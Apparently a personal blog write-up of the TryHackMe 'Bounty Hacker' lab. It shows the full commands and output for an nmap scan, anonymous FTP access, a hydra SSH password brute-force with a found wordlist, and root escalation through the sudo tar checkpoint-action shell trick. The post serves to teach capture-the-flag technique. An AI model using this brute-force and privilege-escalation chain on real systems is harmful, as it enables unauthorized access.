+++ 
categories = ["Hugo"] 
date = "2020-08-27" 
description = "Bounty Hacker - TryHackMe Writeup"

featuredalt = "" 
featuredpath = "date" 
linktitle = "" 
title = "Bounty Hacker - TryHackMe Writeup" 
slug = "Bounty Hacker - TryHackMe Writeup" 
type = "post" 
+++




[![Bounty Hacker - TryHackMe](bounty_hacker.jpeg](https://tryhackme.com/room/cowboyhacker)


Welcome to my WriteUp. Ok So our journy starts from question 3 but before every question we need to enumerate the mechine. So Let's do it with **nmap**

## Service enumeration

```
# nmap -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 02:25 +06
Nmap scan report for 10.10.196.2
Host is up (0.31s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.67.68
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.50 seconds

```

Here we have port 21,22,80 open and we can see ftp have anonymous login allowed so let's do it.
```
Username : Anonymous
Password : Anonymous # In this mechine we don't need password to login.
```

## FTP enumeration

```
# ftp $ip
Connected to 10.10.196.2.
220 (vsFTPd 3.0.3)
Name (10.10.196.2:root): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
226 Directory send OK.
```

Here we have 2 text file. Grab it on our computer using mget *
If You want to download file one by one then you can simply use **get filename.ext**

```
ftp> mget *
mget locks.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.00 secs (350.0884 kB/s)
mget task.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (220.6188 kB/s)
ftp> exit
221 Goodbye.
```
Ok So now we have two text file. From this two we will get our 3rd question answer.
If we look at question number 4 it say's **What service can you bruteforce with the text file found?** The text file locks.txt looks like a dictionary file we can bruteforce with this file on ssh using hydra.


## Bruteforce

**-l (Username)**
**-P (Password file)**

```
hydra -l lin -P ./locks.txt ssh://$ip 
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-27 02:31:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.196.2:22/
[22][ssh] host: $ip   login: lin   password: Re***4g***yn***at*
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-28 02:32:03

```

Now we have ssh username and password so let's login on ssh.

```
# ssh lin@$ip

lin@10.10.196.2's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)


lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM{C****_SyN******}
```

Here we got our **User.txt**


## Privilege Escalation


Now we have to get root.txt

If you try :
```
lin@bountyhacker:~/Desktop$ cat /root/root.txt
cat: /root/root.txt: Permission denied
```
So we have to get root access.
Start with ** sudo -l **
```
lin@bountyhacker:~$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```


We can run root using ** tar **
Now we need to find Root Escalation for tar. I always use gtfobins.github.io for this type of escalation.
If we search tar on GTFOBINS then we will found a line of code in **Sudo Section**
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

You need to copy this code and pest on your bountyhacker ssh shell

```
lin@bountyhacker:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
THM{8***Y_h****r}
```


**Congratulations** you just complete Bounty Hacker from TryHackMe.
Thank You and see you on next writeup.
















